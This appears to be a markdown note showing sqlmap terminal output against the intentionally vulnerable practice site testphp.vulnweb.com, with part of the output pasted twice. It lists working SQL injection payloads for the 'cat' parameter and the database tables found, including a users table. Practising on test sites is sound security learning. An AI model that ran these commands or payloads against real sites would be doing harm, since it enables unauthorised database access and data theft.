### sample terminal output.

> All commands for testing and reporting.

```bash
grey@mi-14:~$ sqlmap  -u http://testphp.vulnweb.com/listproducts.php?cat=2 -D acuart --tables
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.6.4#stable}
|_ -| . [.]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 21:10:18 /2023-10-05/

[21:10:18] [INFO] resuming back-end DBMS 'mysql'
[21:10:18] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: cat (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: cat=2 AND 9513=9513

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: cat=2 AND GTID_SUBSET(CONCAT(0x716b626271,(SELECT (ELT(2747=2747,1))),0x716b766a71),2747)

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: cat=2 AND (SELECT 3137 FROM (SELECT(SLEEP(5)))UitH)

    Type: UNION query
    Title: Generic UNION query (NULL) - 11 columns
    Payload: cat=2 UNION ALL SELECT NULL,CONCAT(0x716b626271,0x615a454b67737246465044684351626d58745a6d4e4e61716e65426b7549716c46426f4e4c73574e,0x716b766a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
---
[21:10:19] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.19.0, PHP 5.6.40
back-end DBMS: MySQL >= 5.6
[21:10:19] [INFO] fetching tables for database: 'acuart'
Database: acuart
[8 tables]
+-----------+
| artists   |
| carts     |
| categ     |
| featured  |
| guestbook |
| pictures  |
| products  |
| users     |
+-----------+

## Information fetched  to  '/home/grey/.local/share/sqlmap/output/testphp.vulnweb.com'
```bash
back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.19.0, PHP 5.6.40
back-end DBMS: MySQL >= 5.6
[21:10:19] [INFO] fetching tables for database: 'acuart'
Database: acuart
[8 tables]
+-----------+
| artists   |
| carts     |
| categ     |
| featured  |
| guestbook |
| pictures  |
| products  |
| users     |
+-----------+
```
